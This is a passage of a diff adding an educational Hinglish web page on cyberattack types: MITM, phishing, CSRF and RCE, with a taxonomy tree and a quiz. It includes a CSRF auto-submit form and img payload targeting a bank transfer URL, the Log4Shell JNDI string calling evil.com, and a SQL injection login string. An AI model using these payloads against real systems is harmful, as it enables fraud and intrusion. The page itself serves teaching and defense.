+        <div class="atk-name" style="color:var(--mitm)">MAN-IN-THE-MIDDLE (MITM)</div>
+      </div>
+      <span class="severity-badge sev-critical">CRITICAL</span>
+    </div>
+    <div class="attack-body">
+      <div class="atk-card">
+        <div class="atk-card-label">📖 Definition</div>
+        <div class="atk-def">A Man-in-the-Middle attack occurs when an attacker secretly intercepts and potentially alters communication between two parties who believe they are communicating directly with each other.</div>
+      </div>
+      <div class="atk-card">
+        <div class="atk-card-label">🤔 Hinglish Explanation</div>
+        <div class="atk-desc">
+          Soch tum apne dost ko letter bhej rahe ho. Beech mein ek daku wo letter chura leta hai, padhta hai, kabhi modify bhi karta hai — aur phir aage bhej deta hai. <em>Dono ko pata nahi ki koi beech mein hai!</em> MITM exactly yahi karta hai digital world mein.
+        </div>
+      </div>
+      <div class="code-block">
+        <div class="code-label">ARP Poisoning — Common MITM Technique</div>
+        <pre><span class="cmt">-- Normal: User ↔ Router ↔ Internet</span>
+<span class="str">User (192.168.1.5) → Router (192.168.1.1) → Bank</span>
+
+<span class="cmt">-- After ARP Poisoning:</span>
+<span class="warn-c">User thinks Router MAC = Hacker's MAC</span>
+<span class="warn-c">Router thinks User MAC  = Hacker's MAC</span>
+
+<span class="cmt">-- All traffic now flows through hacker:</span>
+<span class="hl">User → Hacker (intercepts/reads/modifies) → Router → Bank</span>
+
+<span class="cmt">-- Hacker sees: login creds, bank details, messages!</span>
+<span class="cmt">-- Tool used: Ettercap, arpspoof, Bettercap</span></pre>
+      </div>
+      <div class="atk-card">
+        <div class="atk-card-label">Common MITM Variants</div>
+        <div class="atk-desc" style="font-size:13px;">
+          <strong style="color:var(--mitm)">Evil Twin WiFi</strong> — Fake hotspot "Free_Airport_WiFi" banao, sab connect karein, sab traffic dekho.<br>
+          <strong style="color:var(--mitm)">SSL Stripping</strong> — HTTPS ko HTTP mein convert karo — encrypted data plain text mein aa jaata hai.<br>
+          <strong style="color:var(--mitm)">DNS Spoofing</strong> — DNS response modify karo taaki bank.com ki jagah fake website pe jaaye.
+        </div>
+      </div>
+      <div class="atk-card">
+        <div class="atk-card-label">💥 Impact</div>
+        <div class="tag-row">
+          <span class="tag impact">Credential theft</span>
+          <span class="tag impact">Data interception</span>
+          <span class="tag impact">Session hijack</span>
+          <span class="tag impact">Financial fraud</span>
+        </div>
+      </div>
+      <div class="atk-card">
+        <div class="atk-card-label">🛡️ Defense</div>
+        <div class="tag-row">
+          <span class="tag defense">HTTPS / TLS</span>
+          <span class="tag defense">VPN use karo</span>
+          <span class="tag defense">Certificate pinning</span>
+          <span class="tag defense">Public WiFi avoid karo</span>
+          <span class="tag defense">HSTS headers</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="atk-divider"></div>
+
+  <!-- ── PHISHING ── -->
+  <div id="phish" class="attack-block fi">
+    <div class="attack-header">
+      <div class="attack-icon" style="background:rgba(255,159,67,0.1);border:1px solid rgba(255,159,67,0.25);">🎣</div>
+      <div class="atk-meta">
+        <div class="atk-type" style="color:var(--phish)">Social Engineering · Active · Human Layer</div>
+        <div class="atk-name" style="color:var(--phish)">PHISHING</div>
+      </div>
+      <span class="severity-badge sev-high">HIGH</span>
+    </div>
+    <div class="attack-body">
+      <div class="atk-card">
+        <div class="atk-card-label">📖 Definition</div>
+        <div class="atk-def">Phishing is a social engineering attack that uses deceptive emails, messages, or websites impersonating trusted entities to trick victims into revealing sensitive information such as credentials, financial data, or installing malware.</div>
+      </div>
+      <div class="atk-card">
+        <div class="atk-card-label">🤔 Hinglish Explanation</div>
+        <div class="atk-desc">
+          Ye <em>technology hack nahi hai — insaan ko hack karta hai!</em> "Tumhara SBI account band hone wala hai, yahan click karo" — aur jo link dete hain wo fake SBI website hai. Tum password daalo, hacker le jaaye. India mein yahi sabse common cyberattack hai.
+        </div>
+      </div>
+      <div class="atk-card full">
+        <div class="atk-card-label">📋 Types of Phishing</div>
+        <div class="flow-steps">
+          <div class="flow-step">
+            <div class="step-num" style="background:rgba(255,159,67,0.12);color:var(--phish);">📧</div>
+            <div class="step-content">
+              <div class="step-title">Email Phishing</div>
+              <div class="step-desc">Bulk emails — "Dear Customer, your account is compromised." Millions ko bhejo, kuch toh click karenge. Most common type.</div>
+            </div>
+          </div>
+          <div class="flow-step">
+            <div class="step-num" style="background:rgba(255,159,67,0.12);color:var(--phish);">🎯</div>
+            <div class="step-content">
+              <div class="step-title">Spear Phishing</div>
+              <div class="step-desc">Specific person ko target karo — LinkedIn se research karo, name/company use karo. "Hi Bhanu, regarding your project at [company]..." Much more convincing.</div>
+            </div>
+          </div>
+          <div class="flow-step">
+            <div class="step-num" style="background:rgba(255,159,67,0.12);color:var(--phish);">🐳</div>
+            <div class="step-content">
+              <div class="step-title">Whaling</div>
+              <div class="step-desc">CEO, CFO ko target karo. "CEO Fraud" — finance team ko fake CEO email: "urgently transfer ₹50 lakhs to this account." High value target.</div>
+            </div>
+          </div>
+          <div class="flow-step">
+            <div class="step-num" style="background:rgba(255,159,67,0.12);color:var(--phish);">📱</div>
+            <div class="step-content">
+              <div class="step-title">Smishing / Vishing</div>
+              <div class="step-desc">SMS phishing ("OTP verify karo") ya Voice phishing ("main bank officer bol raha hoon"). India mein OTP fraud isi se hota hai.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="atk-card">
+        <div class="atk-card-label">🛡️ Defense</div>
+        <div class="tag-row">
+          <span class="tag defense">Sender verify karo</span>
+          <span class="tag defense">Links hover karo</span>
+          <span class="tag defense">2FA enable karo</span>
+          <span class="tag defense">Security awareness training</span>
+          <span class="tag defense">Email filters / SPF, DKIM</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="atk-divider"></div>
+
+  <!-- ── CSRF ── -->
+  <div id="csrf" class="attack-block fi">
+    <div class="attack-header">
+      <div class="attack-icon" style="background:rgba(72,219,251,0.1);border:1px solid rgba(72,219,251,0.25);">🔄</div>
+      <div class="atk-meta">
+        <div class="atk-type" style="color:var(--csrf)">Web Attack · Active · Session Abuse</div>
+        <div class="atk-name" style="color:var(--csrf)">CROSS-SITE REQUEST FORGERY (CSRF)</div>
+      </div>
+      <span class="severity-badge sev-high">HIGH</span>
+    </div>
+    <div class="attack-body">
+      <div class="atk-card">
+        <div class="atk-card-label">📖 Definition</div>
+        <div class="atk-def">CSRF tricks an authenticated user's browser into sending unauthorized requests to a web application, exploiting the trust the application has in the user's session — performing actions the victim never intended.</div>
+      </div>
+      <div class="atk-card">
+        <div class="atk-card-label">🤔 Hinglish Explanation</div>
+        <div class="atk-desc">
+          Tum bank mein logged in ho ek tab mein. Hacker tumhe ek email bhejta hai — <em>ek innocent-looking link.</em> Jab click karte ho, tumhara browser (jo bank pe logged in hai) automatically bank ko request bhejta hai "transfer ₹10,000 to hacker's account" — aur bank maan leta hai! Tum ne kuch nahi kiya, phir bhi transaction ho gayi.
+        </div>
+      </div>
+      <div class="code-block">
+        <div class="code-label">CSRF Attack — Malicious Hidden Form</div>
+        <pre><span class="cmt">&lt;!-- Hacker's evil website contains: --&gt;</span>
+<span class="warn-c">&lt;img src="https://bank.com/transfer?to=hacker&amp;amount=50000"
+     style="display:none" /&gt;</span>
+
+<span class="cmt">&lt;!-- OR a hidden auto-submit form: --&gt;</span>
+<span class="warn-c">&lt;form action="https://bank.com/transfer" method="POST"&gt;
+  &lt;input type="hidden" name="to"     value="hacker_account" /&gt;
+  &lt;input type="hidden" name="amount" value="50000" /&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</span>
+
+<span class="cmt">&lt;!-- Victim visits page while logged in to bank → transfer happens! --&gt;</span></pre>
+      </div>
+      <div class="atk-card">
+        <div class="atk-card-label">💥 Impact</div>
+        <div class="tag-row">
+          <span class="tag impact">Unauthorized transactions</span>
+          <span class="tag impact">Account changes</span>
+          <span class="tag impact">Data modification</span>
+        </div>
+      </div>
+      <div class="atk-card">
+        <div class="atk-card-label">🛡️ Defense</div>
+        <div class="tag-row">
+          <span class="tag defense">CSRF tokens</span>
+          <span class="tag defense">SameSite cookies</span>
+          <span class="tag defense">Referer header check</span>
+          <span class="tag defense">Re-authentication</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="atk-divider"></div>
+
+  <!-- ── RCE ── -->
+  <div id="rce" class="attack-block fi">
+    <div class="attack-header">
+      <div class="attack-icon" style="background:rgba(255,61,87,0.12);border:1px solid rgba(255,61,87,0.3);">💀</div>
+      <div class="atk-meta">
+        <div class="atk-type" style="color:var(--rce)">System Attack · Active · Most Dangerous</div>
+        <div class="atk-name" style="color:var(--rce)">REMOTE CODE EXECUTION (RCE)</div>
+      </div>
+      <span class="severity-badge sev-critical">CRITICAL</span>
+    </div>
+    <div class="attack-body">
+      <div class="atk-card">
+        <div class="atk-card-label">📖 Definition</div>
+        <div class="atk-def">Remote Code Execution (RCE) is a vulnerability that allows an attacker to execute arbitrary code on a target machine over a network, often resulting in complete system compromise with the attacker gaining full control.</div>
+      </div>
+      <div class="atk-card">
+        <div class="atk-card-label">🤔 Hinglish Explanation</div>
+        <div class="atk-desc">
+          Ye sabse khatarnaak attack hai. <em>Hacker tumhare computer pe baith ke koi bhi command chala sakta hai</em> — remotely! Files delete karo, ransomware install karo, data nikalo, backdoor lagao — sab kuch. Log4Shell (2021) isi type ka attack tha jo billions of devices affect karta tha.
+        </div>
+      </div>
+      <div class="atk-card full">
+        <div class="atk-card-label">Famous RCE Vulnerabilities</div>
+        <div class="flow-steps">
+          <div class="flow-step">
+            <div class="step-num" style="background:rgba(255,61,87,0.12);color:var(--rce);">💥</div>
+            <div class="step-content">
+              <div class="step-title">Log4Shell (CVE-2021-44228)</div>
+              <div class="step-desc">Java logging library Log4j mein. Ek simple string "${jndi:ldap://evil.com/a}" log karo aur server pe code execute ho jaata hai. Billions of servers affected.</div>
+            </div>
+          </div>
+          <div class="flow-step">
+            <div class="step-num" style="background:rgba(255,61,87,0.12);color:var(--rce);">💥</div>
+            <div class="step-content">
+              <div class="step-title">EternalBlue (MS17-010)</div>
+              <div class="step-desc">NSA ka leaked exploit, Windows SMB mein. WannaCry aur NotPetya ransomware ne isse use kiya — 200+ countries mein $10 billion ka nuksaan.</div>
+            </div>
+          </div>
+          <div class="flow-step">
+            <div class="step-num" style="background:rgba(255,61,87,0.12);color:var(--rce);">💥</div>
+            <div class="step-content">
+              <div class="step-title">Shellshock (CVE-2014-6271)</div>
+              <div class="step-desc">Bash shell vulnerability — web servers, routers, Mac systems sab affected. HTTP request mein command inject karo, server execute kar deta hai.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="atk-card">
+        <div class="atk-card-label">🛡️ Defense</div>
+        <div class="tag-row">
+          <span class="tag defense">Patch immediately</span>
+          <span class="tag defense">Input validation</span>
+          <span class="tag defense">Sandboxing</span>
+          <span class="tag defense">Least privilege</span>
+          <span class="tag defense">WAF rules</span>
+          <span class="tag defense">Network segmentation</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="atk-divider"></div>
+
+  <!-- ── TAXONOMY TREE ── -->
+  <div id="tree" class="sec-title fi">
+    <div class="stag">// 03-B &nbsp; FULL MAP</div>
+    <h2>ATTACK TAXONOMY TREE</h2>
+    <p class="sdesc">Poora picture ek jagah — attacks ka hierarchical structure.</p>
+  </div>
+
+  <div class="tree-wrap fi">
+    <div class="tree-title">// CYBER ATTACK TAXONOMY</div>
+    <ul class="tree">
+      <li>
+        <span class="tnode" style="color:var(--danger);font-family:var(--font-d);font-size:14px;letter-spacing:1px;">⚔ ACTIVE ATTACKS</span>
+        <ul>
+          <li><span class="tnode">├ Web Application Attacks
+            <span class="tpill" style="background:rgba(255,107,107,0.1);color:#ff6b6b;border:1px solid rgba(255,107,107,0.2)">Server-side</span></span>
+            <ul>
+              <li><span class="tnode">├ SQL Injection (SQLi) — DB manipulation</span></li>
+              <li><span class="tnode">├ Command Injection — OS commands via input</span></li>
+              <li><span class="tnode">├ XML Injection / XXE — XML parser abuse</span></li>
+              <li><span class="tnode">└ File Inclusion (LFI/RFI) — include remote files</span></li>
+            </ul>
+          </li>
+          <li><span class="tnode">├ Client-Side Attacks
+            <span class="tpill" style="background:rgba(255,217,61,0.08);color:#ffd93d;border:1px solid rgba(255,217,61,0.2)">Browser</span></span>
+            <ul>
+              <li><span class="tnode">├ XSS (Stored / Reflected / DOM)</span></li>
+              <li><span class="tnode">├ CSRF — forged requests</span></li>
+              <li><span class="tnode">└ Clickjacking — hidden iframe trick</span></li>
+            </ul>
+          </li>
+          <li><span class="tnode">├ Network Attacks
+            <span class="tpill" style="background:rgba(255,94,87,0.1);color:#ff5e57;border:1px solid rgba(255,94,87,0.2)">Infrastructure</span></span>
+            <ul>
+              <li><span class="tnode">├ DDoS (Volumetric / Protocol / App-layer)</span></li>
+              <li><span class="tnode">├ MITM (ARP Poisoning / SSL Strip / DNS Spoof)</span></li>
+              <li><span class="tnode">├ Session Hijacking — cookie theft</span></li>
+              <li><span class="tnode">└ IP Spoofing — fake source address</span></li>
+            </ul>
+          </li>
+          <li><span class="tnode">├ System / Host Attacks</span>
+            <ul>
+              <li><span class="tnode">├ RCE — Remote Code Execution</span></li>
+              <li><span class="tnode">├ Buffer Overflow — memory corruption</span></li>
+              <li><span class="tnode">├ Privilege Escalation — higher access gain</span></li>
+              <li><span class="tnode">└ Ransomware — encrypt &amp; extort</span></li>
+            </ul>
+          </li>
+          <li><span class="tnode">└ Social Engineering
+            <span class="tpill" style="background:rgba(255,159,67,0.1);color:#ff9f43;border:1px solid rgba(255,159,67,0.2)">Human</span></span>
+            <ul>
+              <li><span class="tnode">├ Phishing / Spear Phishing / Whaling</span></li>
+              <li><span class="tnode">├ Vishing / Smishing</span></li>
+              <li><span class="tnode">├ Baiting — USB drops, fake downloads</span></li>
+              <li><span class="tnode">└ Pretexting — fake identity/scenario</span></li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+      <li style="margin-top:16px;">
+        <span class="tnode" style="color:var(--passive);font-family:var(--font-d);font-size:14px;letter-spacing:1px;">👁 PASSIVE ATTACKS</span>
+        <ul>
+          <li><span class="tnode">├ Network Surveillance</span>
+            <ul>
+              <li><span class="tnode">├ Packet Sniffing — Wireshark, tcpdump</span></li>
+              <li><span class="tnode">├ Traffic Analysis — pattern extraction</span></li>
+              <li><span class="tnode">└ Port Scanning — Nmap recon</span></li>
+            </ul>
+          </li>
+          <li><span class="tnode">└ Information Gathering (OSINT)</span>
+            <ul>
+              <li><span class="tnode">├ Keylogging — hardware &amp; software</span></li>
+              <li><span class="tnode">├ Shoulder Surfing — physical observation</span></li>
+              <li><span class="tnode">└ Dumpster Diving — discarded documents</span></li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <!-- ── QUIZ ── -->
+  <div id="quiz" class="sec-title fi">
+    <div class="stag">// 03-C &nbsp; ASSESSMENT</div>
+    <h2>QUIZ — TEST KARO</h2>
+  </div>
+
+  <div class="quiz-wrap fi">
+    <div class="quiz-title">⚡ RAPID FIRE</div>
+    <div class="quiz-sub">// concepts clear hain? let's verify //</div>
+
+    <div class="qblock" data-ans="2">
+      <div class="qtxt">1. Hacker ne login form mein <code>' OR '1'='1</code> daal ke database access kar liya. Ye kaun sa attack hai?</div>
+      <div class="qopts">
+        <button class="qbtn" onclick="qa(this,0,0)">A) XSS</button>
+        <button class="qbtn" onclick="qa(this,0,1)">B) CSRF</button>
+        <button class="qbtn" onclick="qa(this,0,2)">C) SQL Injection ✓</button>
+        <button class="qbtn" onclick="qa(this,0,3)">D) MITM</button>
+      </div>
+      <div class="qfb" id="qf0"></div>
+    </div>
+
+    <div class="qblock" data-ans="1">
+      <div class="qtxt">2. Public WiFi pe koi tumhari aur bank ke beech ki communication intercept kar raha hai — dono ko pata nahi. Ye kya hai?</div>
+      <div class="qopts">
+        <button class="qbtn" onclick="qa(this,1,0)">A) DDoS</button>
+        <button class="qbtn" onclick="qa(this,1,1)">B) MITM ✓</button>
+        <button class="qbtn" onclick="qa(this,1,2)">C) Phishing</button>
+        <button class="qbtn" onclick="qa(this,1,3)">D) RCE</button>
+      </div>
+      <div class="qfb" id="qf1"></div>
+    </div>
+
+    <div class="qblock" data-ans="0">
+      <div class="qtxt">3. Passive attack vs Active attack — kaunsa zyada easily detect hota hai?</div>
+      <div class="qopts">
+        <button class="qbtn" onclick="qa(this,2,0)">A) Active attack ✓</button>
+        <button class="qbtn" onclick="qa(this,2,1)">B) Passive attack</button>
+        <button class="qbtn" onclick="qa(this,2,2)">C) Dono same hain</button>
+      </div>
+      <div class="qfb" id="qf2"></div>
+    </div>
+
+    <div class="qblock" data-ans="3">
+      <div class="qtxt">4. JavaScript ko ek website ke comment box mein inject karna taaki baaki users ka session cookie chura sako — ye kaun sa attack hai?</div>
+      <div class="qopts">
+        <button class="qbtn" onclick="qa(this,3,0)">A) SQLi</button>
+        <button class="qbtn" onclick="qa(this,3,1)">B) CSRF</button>
+        <button class="qbtn" onclick="qa(this,3,2)">C) RCE</button>
+        <button class="qbtn" onclick="qa(this,3,3)">D) Stored XSS ✓</button>
+      </div>
+      <div class="qfb" id="qf3"></div>
+    </div>
+
+    <div class="qblock" data-ans="1">
+      <div class="qtxt">5. Tum bank mein logged in ho. Hacker ki website pe jaate ho — ek invisible form automatically bank pe request bhejti hai tumhare naam se. Ye kya hai?</div>
+      <div class="qopts">
+        <button class="qbtn" onclick="qa(this,4,0)">A) Phishing</button>
+        <button class="qbtn" onclick="qa(this,4,1)">B) CSRF ✓</button>
+        <button class="qbtn" onclick="qa(this,4,2)">C) XSS</button>
+        <button class="qbtn" onclick="qa(this,4,3)">D) MITM</button>
+      </div>
+      <div class="qfb" id="qf4"></div>
+    </div>
+
+    <div class="qblock" data-ans="2">
+      <div class="qtxt">6. Log4Shell, EternalBlue, Shellshock — ye teeno kaunsi attack category ke examples hain?</div>
+      <div class="qopts">
+        <button class="qbtn" onclick="qa(this,5,0)">A) DDoS</button>
+        <button class="qbtn" onclick="qa(this,5,1)">B) SQL Injection</button>
+        <button class="qbtn" onclick="qa(this,5,2)">C) Remote Code Execution ✓</button>
+        <button class="qbtn" onclick="qa(this,5,3)">D) MITM</button>
+      </div>
+      <div class="qfb" id="qf5"></div>
+    </div>
+  </div>
+
+</div><!-- /wrap -->
+
+<footer>
+  <div class="cr-box">
+    <span class="cr-label">© Copyright 2025 — All Rights Reserved</span>
+    <span class="cr-name">BHANU PRATAP SINGH RAJPUROHIT</span>
+    <span class="cr-sub">Cybersecurity Notes — Module 03 · Attack Taxonomy</span>
+  </div>
+  <div style="font-family:var(--font-m);font-size:11px;color:#2a3550;letter-spacing:1px;">
+    CIA TRIAD SERIES &nbsp;|&nbsp; MODULE 01: CIA TRIAD &nbsp;·&nbsp; MODULE 02: HACKER TYPES &nbsp;·&nbsp; MODULE 03: ATTACK TAXONOMY
+  </div>
+  <div class="cr-warn">⚠ Educational purpose only · Unauthorized use of these techniques is illegal</div>
+</footer>
+
+<script>
+/* MATRIX RAIN */
+const canvas = document.getElementById('matrix-canvas');
+const ctx = canvas.getContext('2d');
+function resize(){ canvas.width=innerWidth; canvas.height=innerHeight; }
+resize(); window.addEventListener('resize', resize);
+const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノ'.split('');
+const cols = Math.floor(innerWidth / 18);
+const drops = Array(cols).fill(1);
+function drawMatrix(){
+  ctx.fillStyle = 'rgba(6,7,9,0.05)';
+  ctx.fillRect(0,0,canvas.width,canvas.height);
+  ctx.fillStyle = '#00e5ff';
+  ctx.font = '14px IBM Plex Mono';
+  drops.forEach((y,i) => {
+    const ch = chars[Math.floor(Math.random()*chars.length)];
+    ctx.fillText(ch, i*18, y*18);
+    if(y*18 > canvas.height && Math.random()>0.975) drops[i]=0;
+    drops[i]++;
+  });
+}
+setInterval(drawMatrix, 60);
+
+/* QUIZ */
+const ANS = [2,1,0,3,1,2];
+const FB = [
+  {ok:"Correct! 💉 Input mein SQL code = SQL Injection. Classic attack, OWASP Top 3 mein hai.",bad:"Galat. Input field mein SQL code inject karna = SQL Injection."},
+  {ok:"Bilkul sahi! 🎭 Beech mein koi intercept kar raha = MITM. Public WiFi pe hamesha VPN use karo!",bad:"Nahi. Dono parties ke beech silently intercept karna = Man-in-the-Middle attack."},
+  {ok:"Sahi! ⚔ Active attacks system modify karte hain — noise hoti hai, detect hone ki chances zyada hain. Passive attacks silently observe karte hain.",bad:"Nahi. Active attacks zyada detectible hote hain kyunki ye system se interact karte hain."},
+  {ok:"Perfect! ⚡ Comment box mein JS inject karna taaki visitors affect ho = Stored XSS. Server pe persist hoti hai.",bad:"Nahi. Script inject karna browser mein execute karne ke liye = XSS (Cross-Site Scripting)."},
+  {ok:"Excellent! 🔄 Tumhare browser ka abuse karke tumhare naam pe request = CSRF. CSRF tokens se rokते hain.",bad:"Nahi yaar! Tumhara browser exploit karna tumhare active session ke saath = CSRF."},
+  {ok:"Wah! 💀 Teeno famous RCE exploits hain — remote se arbitrary code execute karna. Sabse dangerous category!",bad:"Nahi. Log4Shell, EternalBlue, Shellshock = Remote Code Execution vulnerabilities hain."}
+];
+
+function qa(btn, qi, oi){
+  const opts = btn.parentElement.querySelectorAll('.qbtn');
+  opts.forEach(o=>o.disabled=true);
+  const ok = oi===ANS[qi];
+  btn.classList.add(ok?'correct':'wrong');
+  if(!ok) opts[ANS[qi]].classList.add('correct');
+  const fb = document.getElementById('qf'+qi);
+  fb.className = 'qfb show '+(ok?'ok':'bad');
+  fb.textContent = ok ? FB[qi].ok : FB[qi].bad;
+}
+
+/* FADE IN ON SCROLL */
+const obs = new IntersectionObserver(entries=>{
+  entries.forEach(e=>{ if(e.isIntersecting) e.target.classList.add('vis'); });
+},{threshold:0.07});
+document.querySelectorAll('.fi').forEach(el=>obs.observe(el));
+
+/* SMOOTH NAV */
+document.querySelectorAll('a[href^="#"]').forEach(a=>{
+  a.addEventListener('click',e=>{
+    e.preventDefault();
+    const t=document.querySelector(a.getAttribute('href'));
+    if(t) t.scrollIntoView({behavior:'smooth',block:'start'});
+  });
+});
+</script>
+</body>
+</html>
